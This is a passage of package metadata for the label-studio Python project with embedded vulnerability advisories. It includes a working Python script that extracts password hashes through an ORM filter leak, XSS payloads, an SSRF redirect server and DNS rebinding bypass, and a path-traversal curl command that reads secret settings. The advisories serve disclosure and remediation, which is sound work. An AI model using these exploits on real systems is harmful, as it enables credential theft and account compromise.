orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.2/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","PyInquirer (==1.0.3)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c0174b805bb34e969434c156bdc20f9e411e354ece03ce2756b4cf66305ec244","md5":"747da8fe8e0c33390173b664ca01e816","sha256":"55cfd6e48f6ce7495b96e7f674a735302184ab536c43be046ba8ca1632f23746"},"downloads":-1,"filename":"label_studio-0.4.2-py3-none-any.whl","has_sig":false,"md5_digest":"747da8fe8e0c33390173b664ca01e816","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6855333,"upload_time":"2020-01-12T23:59:13","upload_time_iso_8601":"2020-01-12T23:59:13.826503Z","url":"https://files.pythonhosted.org/packages/c0/17/4b805bb34e969434c156bdc20f9e411e354ece03ce2756b4cf66305ec244/label_studio-0.4.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"81c14ac200721becb94da47869addea88782b346e85d8cca2e32a0a06eab87ba","md5":"c9cb1d73692eed54db7014cae7714a11","sha256":"f5a1e50e68e89752e9611967a971f874470e723388024a79271e1d328a3bdb9d"},"downloads":-1,"filename":"label-studio-0.4.2.tar.gz","has_sig":false,"md5_digest":"c9cb1d73692eed54db7014cae7714a11","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6794943,"upload_time":"2020-01-12T23:59:21","upload_time_iso_8601":"2020-01-12T23:59:21.065974Z","url":"https://files.pythonhosted.org/packages/81/c1/4ac200721becb94da47869addea88782b346e85d8cca2e32a0a06eab87ba/label-studio-0.4.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote 